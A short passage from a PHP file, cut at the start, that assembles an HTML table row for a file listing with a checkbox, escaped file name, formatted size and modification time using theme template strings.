      $pd_name === 0 ?
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', THEME_STRING_SPACE),                                             $theme) :
      str_replace(array('{NAME}', '{VALUE}', '{JS_EVENTS}'), array('files[]', htmlEntitiesEx($pd_name), ''),                $ci % 2 ? THEME_LIST_ITEM_INPUT_CHECKBOX_1_U1 : THEME_LIST_ITEM_INPUT_CHECKBOX_1_U2)
    ).
    str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $text),                                                            $theme).
    str_replace(array('{WIDTH}', '{TEXT}'),
                array('auto', is_numeric($size) ? ($size >= 0 ? numberFormatAsInt($size) : THEME_STRING_SPACE) : $size),  $ci % 2 ? THEME_LIST_ITEM_RTEXT_U1 : THEME_LIST_ITEM_RTEXT_U2).
    str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $mtime == 0 ? THEME_STRING_SPACE : htmlEntitiesEx(gmdate(LNG_FORMAT_DT, $mtime))), $ci % 2 ? THEME_LIST_ITEM_RTEXT_U1 : THEME_LIST_ITEM_RTEXT_U2).
  THEME_LIST_ROW_END;
}
?>